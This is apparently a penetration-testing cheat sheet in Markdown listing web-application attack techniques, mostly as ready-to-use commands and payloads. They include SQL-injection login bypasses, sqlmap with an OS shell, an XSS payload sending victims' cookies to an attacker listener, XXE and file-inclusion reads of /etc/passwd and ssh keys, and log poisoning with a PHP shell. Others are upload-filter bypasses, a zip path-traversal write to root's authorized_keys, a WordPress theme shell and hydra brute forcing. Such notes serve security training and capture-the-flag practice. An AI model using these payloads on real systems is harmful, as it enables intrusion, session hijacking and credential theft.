# Web-Applications

- [Web-Applications](#web-applications)
  - [Recon](#recon)
  - [SQL-Injection](#sql-injection)
  - [Server Side Template Injection](#server-side-template-injection)
  - [File Inclusion / Path traversal](#file-inclusion--path-traversal)
    - [PHP Backend](#php-backend)
  - [File Upload](#file-upload)
    - [Filters](#filters)
    - [Zip File Upload](#zip-file-upload)
  - [Regex Bypass](#regex-bypass)
  - [NoSQL-Injection](#nosql-injection)
  - [XML External Entities](#xml-external-entities)
  - [Wordpress](#wordpress)
  - [Brute Force Login](#brute-force-login)

## Recon

- web directories and subdomains
```
gobuster dir -u http://<target-ip> -w <wordlist> -x php,html
gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
```
- ``/robots.txt`` and ``/sitemap.xml``
- view source ``CTRL+U``
- view storage/cookies
- response headers
- 404 error page
- ``Wappalyzer`` (Browser Plugin): technologies used by a website
- ``nikto -h <url>``: web application vulnerabilities
- ``/.git/`` $\Rightarrow$ [git-dumper](https://github.com/arthaud/git-dumper)

## SQL-Injection

- authentication bypass
  ```
	' or 1=1 #
	' or '1'='1' #
	" or 1=1 --
	```
- sqlmap
  ```
  sqlmap -u "http://<target-ip>" --forms
  sqlmap -r request.txt --level 5 --risk 3 --batch
  sqlmap -u "http://<target-ip>" --os-shell
  ```

## Cross-Site-Scripting
    
```html
<script>alert("XSS")</script>
<img src=x onerror=this.src="http://<lhost>:<lport>/?cookie="+document.cookie>
```

## Server Side Template Injection

- input is reflected in response
- ``{{7*7}}`` $\Rightarrow$ 49?
- FUZZ string: ``${{<%[%'"}}%\.``
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

## File Inclusion / Path traversal

- example: ``http://example.com/index.php?page=home.html``
- interesting files:
  - ``/etc/passwd``: users and home directories
  - ``/etc/apache2/sites-enabled/000-default.conf``: default Apache configuration
  - ``/proc/self/cmdline``, ``/proc/self/environ``, ``/proc/self/status``
  - ssh keys
  - web-app files e.g. ``.htaccess`` and ``config.php`` 

### PHP Backend
- PHP wrappers
  - ``expect://id``
  - ``phar://exploit.zip/shell``: upload phar/zip archive and execute PHP file in the archive
  - [PHP filter chain](https://github.com/synacktiv/php_filter_chain_generator)
- Log Poisoning
  - Send request with PHP shell in the User-Agent and include the log file
  - ```
    /var/log/apache2/access.log
    /var/log/apache/access.log
    /var/log/apache2/error.log
    /var/log/apache/error.log
    /var/log/nginx/access.log
    /var/log/nginx/error.log
    ```

## File Upload

### Filters
- file extension
	- upload file with allowed extension and rename the file
  - double extension e.g. ``shell.php.jpg``
  - null byte: ``shell.php%00.jpg``
	- blacklist $\Rightarrow$ try alternative extensions
  	- PHP: phtml, pht, php3, php4, ...
  	- ASP: asp, aspx
- Content-Type Header
	- change header to allowed type
- magic bytes
	- change magic bytes in hex editor
	- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

### Zip File Upload
- upload zip file with symlinks $\Rightarrow$ file read
- write files with path traversal through file names e.g. file with name ``../../../../../root/.ssh/authorized_keys``
- zip file upload + LFI + PHP backend $\Rightarrow$ phar injection

## Regex Bypass

Regex only checks first line $\Rightarrow$ put malicious payload in the second line
```
abc%0d%0a<script>alert("xss")</script>
abc%0d%0a{{7*7}}
```

## NoSQL-Injection

```
admin' || '1'=='1

username[$ne]=foo&password[$ne]=foo
{"username": {"$ne": "foo"}, "password": {"$ne": "foo"} }
```

## XML External Entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<entry>&passwd;</entry>
```

## Wordpress

```
wpscan --url <url> -e u,t,p
wpscan --url <url> -U <users> -P <passwords> -t 50
```
- RCE: add PHP shell to theme

## Brute Force Login

```
hydra -L <users> -P <passwords> <target-ip> http-post-form "<path>:username=^USER^&password=^PASS^:<failure-string>"
```
